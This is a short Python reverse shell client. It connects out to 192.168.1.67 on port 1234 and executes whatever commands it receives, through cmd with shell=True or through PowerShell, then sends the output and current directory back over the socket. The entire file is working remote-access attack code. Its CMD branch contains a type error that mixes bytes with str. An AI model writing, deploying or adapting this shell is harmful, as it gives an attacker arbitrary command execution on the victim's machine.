import os
import socket
import subprocess

s=socket.socket()
host="192.168.1.67"
port=1234
s.connect((host,port))
choice=s.recv(1024)
choice=choice.decode("utf-8")


while True:
   try:
     data=s.recv(10000024)
     if len(data) > 0:
        
        if choice=="CMD":
           if data[:2].decode("utf-8")=="cd":
                os.chdir(data[3:].decode("utf-8"))
                s.sendall(str.encode("\n"+os.getcwd()+'>',"utf-8"))
           else:    
                cmd=subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output=cmd.stdout.read()+cmd.stderr.read()
                string3=str.encode(output+os.getcwd()+'>',"utf-8")
                s.sendall(string3)
           
        elif choice=="PS":
           if data[:2].decode("utf-8")=="cd":
                os.chdir(data[3:].decode("utf-8"))
                s.sendall(str.encode("\n"+os.getcwd()+'>',"utf-8"))
           else:
               p=subprocess.Popen(["powershell","-Command",data.decode("utf-8")],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True,shell=True)
               output=p.stdout.read()+p.stderr.read()
               string3=str.encode(output+os.getcwd()+'>',"utf-8")
               s.sendall(string3)
   except KeyboardInterrupt:
        s.close()
        break
s.close()
